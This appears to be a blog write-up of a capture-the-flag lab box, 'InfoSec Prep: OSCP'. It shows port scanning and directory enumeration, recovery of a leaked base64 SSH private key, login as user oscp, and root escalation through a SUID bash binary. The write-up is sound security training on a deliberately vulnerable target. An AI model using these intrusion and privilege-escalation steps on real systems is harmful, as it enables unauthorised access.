---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

Performing a simple `nmap` scan to identify the attack surface of the target.

## portscan
```bash
$ nmap -Pn -p- -sV 192.168.59.89
```
- 22 (OpenSSH)
- 80 (Apache)
- 33060 (unrecognized)

## website
Performing a simple dir busting on the target

```bash
$ dirb http://192.168.59.89`
```

`Wordpress` seems to be installed on the web server.

> Additionally `dirb` was able to identify the files `robots.txt` and `secret.txt`
{: .prompt-info}

- `robots.txt`: contains the path `/secret.txt`
- `secret.txt`: contains a `base64` blob

---

# exploitation
## preparing
### save the `base64` blob and decode it
```bash
$ base64 -d blob.base64
```

> The decoding reveals that it is an `ssh` private key!
{: .prompt-info}

### generate the public key out of the private key to get the `username`
```bash
ssh-keygen -f ssh.priv -y > ssh.pub
```

> `username` is `oscp`
{: .prompt-info}

## getting a shell and access the first flag
```bash
$ ssh -i ssh.priv oscp@192.168.59.89
bash-5.0$ cat local.txt
*******************************
```

---

# post exploitation
## privilege escalation
Identifiy `SUID` binaries owned by `root`
```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
...
-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /usr/bin/bash
...
```

The website [gtfobins](https://gtfobins.github.io/gtfobins/bash/#suid) reveals that the binary `bash` can be exploited to gain `root` access.

```bash
-bash-5.0$ /usr/bin/bash -p
bash-5.0# whoami
root
```

> Root!
{: .prompt-info}

## get second flag
```bash
bash-5.0# cd /root/
bash-5.0# ls
fix-wordpress  flag.txt  proof.txt  snap
bash-5.0# cat flag.txt 
Your flag is in another file...
bash-5.0# cat proof.txt 
1******************************8
```

Pwned! <@:-)
